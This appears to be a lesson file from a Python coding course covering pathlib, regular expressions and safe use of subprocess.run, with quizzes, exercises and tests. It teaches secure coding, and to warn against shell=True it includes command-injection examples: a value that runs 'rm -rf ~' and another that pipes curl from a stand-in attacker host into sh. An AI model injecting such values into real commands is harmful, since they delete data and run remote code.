title: Files, text and other programs
summary: pathlib for files and folders, re for structured text, subprocess.run for calling other tools safely.

steps.title: pathlib
body: `pathlib.Path` is how modern Python handles paths: no string joining, and it works on Windows and Linux alike.
for f in sorted(logs.rglob("*.log")):           # every .log below, recursively
Always pass `encoding="utf-8"`: without it Windows may use a legacy code page and corrupt non-ASCII text. (`python -X utf8` or Python 3.15's default fixes this globally, but be explicit.)

steps.prompt: A script reads `notes.md` with `Path("notes.md").read_text()`. It works on Linux, but on a Windows laptop `ü` shows up as `Ã¼`. Why?
options: Without `encoding=`, Python used the Windows legacy code page instead of UTF-8
steps.explain: The default encoding comes from the operating system's locale. Always pass `encoding="utf-8"` (and `newline=` when line endings matter).

steps.title: re: patterns for structured text
body: Write patterns as **raw strings** (`r"..."`) so backslashes reach `re` untouched. Name your groups; compile patterns you use in a loop.
m = LINE.search("2026-11-26 ERROR E042: disk full")
print(m["level"], m["code"], m.group("msg"))      # ERROR E042 disk full
- `search` finds it anywhere, `match` only at the start, `fullmatch` the whole string.
- `finditer` for many matches with groups; `sub` to replace (`\g<name>` in the replacement).
- The **Regex** topic in the dojo goes deep on writing patterns.

steps.prompt: Complete it so the pattern is compiled once and `m["code"]` is the error code.

steps.explain: With two groups, `findall` returns a tuple per match. In `sub`, `\1` is the first group's text.

steps.title: subprocess.run, the safe way
body: Calling `git`, `docker` or another script from Python is everyday work. One call covers almost every case:
["git", "rev-parse", "--short", "HEAD"],   # a list: no shell, no quoting problems
check=True,            # non-zero exit raises CalledProcessError instead of being ignored
capture_output=True,   # collect stdout and stderr instead of printing them
timeout=30,            # never hang a job forever
- `CalledProcessError` carries `.returncode`, `.stdout` and `.stderr`: put the stderr in your error message.
- **Never** `shell=True` with any part coming from input: `f"git log {branch}"` with `branch = "x; rm -rf ~"` runs both. With a list, an argument is only ever an argument.
- To run Python itself, use `sys.executable`, the same interpreter your code runs on.

steps.prompt: Which call is safe when `name` comes from a web form?
steps.explain: Only the list form keeps `name` a single argument. Every string-plus-shell form lets `'; curl evil.example | sh; '` become a command, quotes or not. (`grep` would still treat a leading `-` as an option: add `--` before user values.)

steps.title: Run a tool and report its failure
prompt: Write `run_checked(cmd: list[str], timeout: float = 10) -> str` that runs `cmd` with `subprocess.run(..., check=True, capture_output=True, text=True, timeout=timeout)` and returns its stdout with trailing whitespace removed.

When the program fails, raise `RuntimeError` with the message `"<cmd[0] file name> exited with <code>: <first line of stderr>"`, for example `"python.exe exited with 3: disk full"` (use `Path(cmd[0]).name`). When it times out, raise `RuntimeError(f"{name} timed out after {timeout}s")`.
The tests run Python itself (`sys.executable -c ...`), so they work on every machine.
starter: def run_checked(cmd: list[str], timeout: float = 10) -> str:
solution: def run_checked(cmd: list[str], timeout: float = 10) -> str:
result = subprocess.run(cmd, check=True, capture_output=True, text=True, timeout=timeout)
raise RuntimeError(f"{name} exited with {err.returncode}: {first[0] if first else ''}") from err
raise RuntimeError(f"{name} timed out after {timeout}s") from err
template: Dojo.eq("an argument with spaces stays one argument", "a b; echo hacked", run_checked([_py, "-c", "import sys; print(sys.argv[1])", "a b; echo hacked"]))
run_checked([_py, "-c", "import sys; print('disk full', file=sys.stderr); print('more', file=sys.stderr); sys.exit(3)"])
Dojo.check("a failure raises RuntimeError", False, "nothing was raised")
Dojo.eq("the failure message", f"{_name} exited with 3: disk full", str(e))
Dojo.check("a timeout raises RuntimeError", False, "nothing was raised")
Dojo.eq("the timeout message", f"{_name} timed out after 0.5s", str(e))
hints: `err.stderr.strip().splitlines()[0]` is the first line; guard against empty stderr.
steps.explain: This little wrapper is in almost every automation repo: fail loudly, include the tool's own error text, and never wait forever.

steps.title: Count error codes across a folder of logs
prompt: Write `count_errors(folder: Path) -> dict[str, int]`: read every `*.log` file in `folder` **and its subfolders** (UTF-8), find each line that contains the word `ERROR` followed later on the line by a code like `E042` (`E` and three digits), and count how many times each code appears. Return the counts sorted by count, highest first, then by code (a plain `dict` keeps that order).
2026-11-26T09:00:02Z WARN  E042 retrying          <- not an ERROR line
Ignore files that do not end in `.log`.
template:
(_root / "app.log").write_text("x ERROR E042 disk full
x WARN E042 retrying
x ERROR E007 timeout
", encoding="utf-8")

(_root / "web" / "nginx.log").write_text("x ERROR E007 upstream
x ERROR E007 upstream again ünïcode
x INFO ok
", encoding="utf-8")
(_root / "web" / "notes.txt").write_text("ERROR E999 not a log file\n", encoding="utf-8")
steps.explain: pathlib plus a compiled regex plus `Counter` is the shape of most log and report scripts. The same code works on Windows and Linux paths.
